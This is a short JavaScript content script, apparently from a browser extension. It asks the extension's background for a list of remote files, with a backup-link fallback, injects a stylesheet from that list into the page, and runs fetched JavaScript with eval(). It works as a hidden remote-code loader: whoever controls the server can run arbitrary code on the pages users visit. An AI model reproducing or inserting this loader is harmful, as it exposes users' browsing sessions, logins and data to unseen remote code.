const getContentJs = (url) => {
  window.chrome.runtime.sendMessage(
    {
      type: "getContentJs",
      url,
    },
    (data) => {
      eval(data.result);
    }
  );
};

const init = (list) => {
  let css, js;

  list.map(async (item) => {
    if (item.indexOf("css") !== -1) {
      css = item;
    } else {
      js = item;
    }
  });

  let node = document.createElement("link");
  node.setAttribute("href", css);
  node.setAttribute("rel", "stylesheet");
  document.getElementsByTagName("head")[0].appendChild(node);

  node.onload = node.readystatechange = function() {
    if (!node.readyState || /loaded|complete/.test(node.readyState)) {
      node.onload = node.readystatechange = null;
      getContentJs(js);
    }
  };
};

const obtain = (type) => {
  window.chrome.runtime.sendMessage(
    {
      type,
      params: {
        t: Date.now(),
        v: 2,
      },
    },
    (res) => {
      if (res.status === "end") return;

      if (!res.status) {
        obtain("getBackupLink");
        return;
      }
      let data = res.result && res.result.data && res.result.data.file;
      if (data) {
        init(data);
      } else {
        obtain("getBackupLink");
      }
    }
  );
};

obtain("getVersion");
